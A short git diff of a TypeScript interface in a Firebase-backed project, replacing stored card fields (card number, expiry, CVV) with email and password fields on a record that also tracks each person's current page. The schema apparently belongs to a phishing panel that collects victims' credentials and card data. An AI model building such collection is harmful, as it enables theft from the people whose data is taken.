@@ -23,20 +23,13 @@ export { app, auth, db, database };
 export interface NotificationDocument {
   id: string;
   name: string;
+  email: string;
   hasPersonalInfo: boolean;
-  hasCardInfo: boolean;
   currentPage: string;
   time: string;
   notificationCount: number;
   personalInfo?: {
-    fullName: string;
     email: string;
-    phone: string;
-    address: string;
-  };
-  cardInfo?: {
-    cardNumber: string;
-    expirationDate: string;
-    cvv: string;
+    password: string;
   };
 }
